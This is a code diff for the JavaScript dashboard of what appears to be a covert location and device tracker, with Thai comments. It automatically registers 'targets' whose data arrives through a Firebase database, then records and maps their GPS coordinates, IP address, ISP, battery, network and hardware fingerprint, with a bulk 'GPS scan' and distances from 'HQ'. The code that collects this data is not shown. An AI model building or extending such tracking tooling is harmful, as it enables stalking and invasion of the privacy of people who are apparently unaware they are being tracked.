@@ -776,7 +776,9 @@ function renderPlayerList() {
   
   players.forEach((p) => {
     const card = document.createElement('div');
-    card.className = `player-card rounded-lg border border-neutral-700 p-2.5 cursor-pointer ${p.tracking ? 'tracking-on' : 'tracking-off'} ${selectedTarget === p.id ? 'selected' : ''}`;
+    // เพิ่มคลาส latest-connection สำหรับผู้เล่นใหม่ล่าสุด
+    const latestClass = p.isLatest ? 'latest-connection' : '';
+    card.className = `player-card rounded-lg border border-neutral-700 p-2.5 cursor-pointer ${p.tracking ? 'tracking-on' : 'tracking-off'} ${selectedTarget === p.id ? 'selected' : ''} ${latestClass}`;
     card.dataset.id = p.id;
     
     // Get status info for indicator
@@ -788,7 +790,7 @@ function renderPlayerList() {
     // Check if this card is expanded
     const isExpanded = p._expanded || false;
     
-    card.innerHTML = `
+card.innerHTML = `
       <div class="flex items-center justify-between gap-1 mb-1.5">
         <div class="flex items-center gap-2">
           <span class="status-indicator text-sm">${statusInfo.color}</span>
@@ -796,6 +798,7 @@ function renderPlayerList() {
         </div>
         <span class="tracking-badge text-[9px] px-1.5 py-0.5 rounded font-mono shrink-0">${p.tracking ? 'ON' : 'OFF'}</span>
       </div>
+      ${p.isLatest ? '<div class="text-[9px] text-green-400 mb-1 font-mono latest-badge">⭐ Latest Connection (บัญชีล่าสุด)</div>' : ''}
       <div class="text-[10px] text-neutral-400 mb-2 font-mono truncate">
         IP: ${p.ip || '—'} | ${p.os ? translateStatus('OS', p.os) : '—'}
       </div>
@@ -2224,6 +2227,9 @@ function bindEvents() {
   // Initialize Mobile Drawers
   initMobileDrawers();
   
+  // Initialize Top Bar Quick Actions
+  bindTopBarEvents();
+  
   window.addEventListener('resize', () => {
     try { mapInstance?.invalidateSize(); } catch (_) {}
   });
@@ -2290,6 +2296,7 @@ function updateAdminAccountIcon() {
 // ===== FIREBASE REAL-TIME LISTENER =====
 let firebaseDb = null;
 let firebaseConnected = false;
+let latestConnectionId = null; // เก็บ ID ผู้เล่นล่าสุดที่เชื่อมต่อ
 
 function initFirebaseListener() {
   // ตรวจสอบว่า Firebase ถูกโหลดและพร้อมใช้งาน
@@ -2298,8 +2305,8 @@ function initFirebaseListener() {
     try {
       if (typeof firebase !== 'undefined' && firebase.initializeApp) {
         firebase.initializeApp({
-          projectId: 'shadow-eye-matrix',
-          databaseURL: 'https://shadow-eye-matrix-default-rtdb.firebaseio.com'
+          projectId: 'eye-shadow-a4f8c',
+          databaseURL: 'https://eye-shadow-a4f8c-default-rtdb.asia-southeast1.firebasedatabase.app/'
         });
       }
     } catch (e) {
@@ -2345,7 +2352,69 @@ function initFirebaseListener() {
 
 function handleRealTimeLocationData(targetId, data) {
   // ค้นหาผู้เล่นที่ตรงกับ targetId
-  const p = getPlayer(targetId);
+  let p = getPlayer(targetId);
+  
+  // ถ้าไม่มีผู้เล่นในระบบ ให้เพิ่มผู้เล่นใหม่โดยอัตโนมัติ
+  if (!p && data.coords) {
+    // เพิ่มผู้เล่นใหม่จาก IP ที่ยิงเข้ามา
+    const newPlayer = {
+      id: targetId,
+      name: `Player ${players.length + 1}`,
+      tracking: false,
+      coords: data.coords,
+      lastUpdate: data.timestamp || new Date().toISOString(),
+      permission: data.permission,
+      source: data.source,
+      distanceKm: data.distanceKm,
+      ip: data.ipData?.ip || data.ip || null,
+      isp: data.ipData?.org || data.isp || null,
+      battery: data.battery,
+      charging: data.charging,
+      network: data.network,
+      os: data.fingerprint?.os || data.os || null,
+      screen: data.fingerprint?.screen || data.screen || null,
+      notes: '',
+      identity: '',
+      lastOnline: data.timestamp || new Date().toISOString(),
+      lastOffline: null,
+      _expanded: false,
+      isLatest: true // ทำเถื่อนว่าเป็นผู้เล่นใหม่ล่าสุด
+    };
+    
+    // Hardware Telemetry
+    if (data.fingerprint) {
+      newPlayer.deviceType = data.fingerprint.deviceType || null;
+      newPlayer.cpuCores = data.fingerprint.cpuCores || null;
+      newPlayer.ramGB = data.fingerprint.ramGB || null;
+      newPlayer.gpu = data.fingerprint.gpu || null;
+    }
+    
+    players.push(newPlayer);
+    p = newPlayer;
+    latestConnectionId = targetId;
+    
+    // เพิ่มเหตุการณ์ลงในไทม์ไลน์
+    addTimelineEvent(targetId, 'online', { coords: p.coords });
+    
+    // บันทึกลง localStorage
+    savePlayers();
+    
+    // อัปเดตแผนที่
+    if (mapInstance && p.coords) {
+      updateMapMarker('player', targetId, p.coords.latitude, p.coords.longitude,
+        `<b>${esc(p.name)}</b><br>${p.coords.latitude.toFixed(5)}, ${p.coords.longitude.toFixed(5)}<br>${p.distanceKm ? p.distanceKm.toFixed(2) + ' km from HQ' : ''}<br><a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
+      panMapTo(p.coords.latitude, p.coords.longitude, 14);
+    }
+    
+    // อัปเดตรายการผู้เล่น
+    renderPlayerList();
+    
+    // ส่งข้อความไปยัง Activity Log Console
+    pushToActivityLogConsole(targetId, data, true);
+    
+    return;
+  }
+  
   if (!p || !data.coords) return;
   
   // ตรวจสอบว่ามีข้อมูลใหม่จริงๆ ก่อนอัปเดต
@@ -2452,6 +2521,157 @@ function pushToActivityLogConsole(targetId, data) {
   while (activityLogEl.children.length > 50) {
     activityLogEl.removeChild(activityLogEl.lastChild);
   }
+}
+
+// ===== TACTICAL MAP FUNCTIONS =====
+// GPS Scan - ดึงข้อมูลล่าสุดจาก Firebase และอัปเดต Marker ทั้งหมด
+function scanAllPlayersFromFirebase() {
+  if (!firebaseDb) {
+    appendLog('[GPS SCAN] Firebase not connected', LOG.red);
+    return;
+  }
+  
+  appendLog('[GPS SCAN] Scanning all players from Firebase...', LOG.orange);
+  
+  firebaseDb.ref('player_coordinates').once('value').then((snapshot) => {
+    const data = snapshot.val();
+    if (!data) {
+      appendLog('[GPS SCAN] No data found in Firebase', LOG.orange);
+      return;
+    }
+    
+    Object.keys(data).forEach((targetId) => {
+      const playerData = data[targetId];
+      if (playerData && playerData.coords) {
+        handleRealTimeLocationData(targetId, playerData);
+      }
+    });
+    
+    appendLog(`[GPS SCAN] Scanned ${Object.keys(data).length} players`, LOG.green);
+  }).catch((error) => {
+    appendLog(`[GPS SCAN] Error: ${error.message}`, LOG.red);
+  });
+}
+
+// แสดง Tooltip/Info Window สำหรับ Battery หรือ Network บนหัว Marker
+function showPlayerInfoTooltip(playerId, type) {
+  const p = getPlayer(playerId);
+  if (!p || !p.coords) return;
+  
+  let tooltipContent = '';
+  if (type === 'battery') {
+    const batteryPercent = p.battery !== null ? p.battery : '—';
+    const chargingStatus = p.charging ? ' (กำลังชาร์จไฟ)' : '';
+    tooltipContent = `<div class="text-yellow-400"><b>🔋 Battery Status</b><br>แบตเตอรี่: ${batteryPercent}%${chargingStatus}</div>`;
+  } else if (type === 'network') {
+    const networkStatus = p.network ? translateStatus('Connection', p.network) : '—';
+    tooltipContent = `<div class="text-blue-400"><b>📶 Network Status</b><br>เครือข่าย: ${networkStatus}</div>`;
+  }
+  
+  if (mapMarkers.players[playerId]) {
+    mapMarkers.players[playerId].bindPopup(tooltipContent).openPopup();
+  }
+}
+
+// Clear Map - ล้างสัญลักษณ์และเส้นทางบนแผนที่
+function clearMapMarkers() {
+  if (!mapInstance) return;
+  
+  // ล้าง Marker ผู้เล่นทั้งหมด
+  Object.keys(mapMarkers.players).forEach((id) => {
+    if (mapMarkers.players[id]) {
+      try {
+        mapMarkers.players[id].remove();
+      } catch (_) {}
+    }
+  });
+  
+  // รีเซ็ต Marker ผู้เล่น
+  mapMarkers.players = {};
+  
+  // ลบข้อมูลผู้เล่นทั้งหมด
+  players = [];
+  savePlayers();
+  renderPlayerList();
+  
+  appendLog('[CLEAR] All map markers and player data cleared', LOG.green);
+}
+
+// อัปเดตการแสดงผลผู้เล่นใหม่ล่าสุดด้วยกรอบสีเขียวเรืองแสง
+function highlightLatestPlayer() {
+  if (!latestConnectionId) return;
+  
+  // ลบคลาสเดิมออกจากผู้เล่นทั้งหมด
+  players.forEach((p) => {
+    p.isLatest = false;
+  });
+  
+  // ให้คลาสให้ผู้เล่นล่าสุด
+  const latestPlayer = getPlayer(latestConnectionId);
+  if (latestPlayer) {
+    latestPlayer.isLatest = true;
+  }
+  
+  // อัปเดตการแสดงผล
+  renderPlayerList();
+}
+
+// ===== EVENT BINDING FOR TOP BAR QUICK ACTIONS =====
+function bindTopBarEvents() {
+  // Top Bar GPS Scan Button
+  const topGpsBtn = $('top-gps-btn');
+  topGpsBtn?.addEventListener('click', () => {
+    if (isObserver()) {
+      showObserverWarning();
+      return;
+    }
+    scanAllPlayersFromFirebase();
+  });
+  
+  // Top Bar Battery Button
+  const topBatteryBtn = $('top-battery-btn');
+  topBatteryBtn?.addEventListener('click', () => {
+    if (selectedTarget && selectedTarget !== 'admin') {
+      showPlayerInfoTooltip(selectedTarget, 'battery');
+    } else if (players.length > 0) {
+      // แสดงข้อมูลแบตเตอรี่ของผู้เล่นที่เลือกหรือผู้เล่นแรก
+      const targetId = selectedTarget !== 'admin' ? selectedTarget : players[0].id;
+      showPlayerInfoTooltip(targetId, 'battery');
+    }
+  });
+  
+  // Top Bar Network Button
+  const topNetworkBtn = $('top-network-btn');
+  topNetworkBtn?.addEventListener('click', () => {
+    if (selectedTarget && selectedTarget !== 'admin') {
+      showPlayerInfoTooltip(selectedTarget, 'network');
+    } else if (players.length > 0) {
+      const targetId = selectedTarget !== 'admin' ? selectedTarget : players[0].id;
+      showPlayerInfoTooltip(targetId, 'network');
+    }
+  });
+  
+  // Top Bar Clear Button
+  const topClearBtn = $('top-clear-btn');
+  topClearBtn?.addEventListener('click', () => {
+    if (isObserver()) {
+      showObserverWarning();
+      return;
+    }
+    if (confirm('ยืนยันการล้างข้อมูลผู้เล่นทั้งหมดบนแผนที่?')) {
+      clearMapMarkers();
+    }
+  });
+  
+  // Top Bar Back to Menu Button
+  const topBackBtn = $('top-back-btn');
+  topBackBtn?.addEventListener('click', () => {
+    showLoading('กลับสู่เมนูหน้าแรก...');
+    setTimeout(() => {
+      showAppSelector();
+      hideLoading();
+    }, 500);
+  });
 }
 
 // ===== BOOT =====
